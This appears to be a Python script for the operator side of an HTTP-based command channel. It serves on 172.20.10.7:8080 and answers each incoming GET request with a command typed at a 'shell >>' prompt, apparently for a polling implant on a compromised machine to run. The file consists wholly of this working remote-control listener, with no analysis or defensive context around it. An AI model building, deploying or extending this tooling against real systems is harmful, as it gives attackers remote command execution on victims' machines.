from  http.server import BaseHTTPRequestHandler
from http.server import HTTPServer


class PostGetRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        command = input("shell >>  ")
        self.wfile.write(command.encode())


def web_server():
    print("Listing on  172.20.10.7:8080 \n")
    server = HTTPServer
    httpd = server(("172.20.10.7", 8080), PostGetRequestHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()


if __name__ == "__main__":
    web_server()
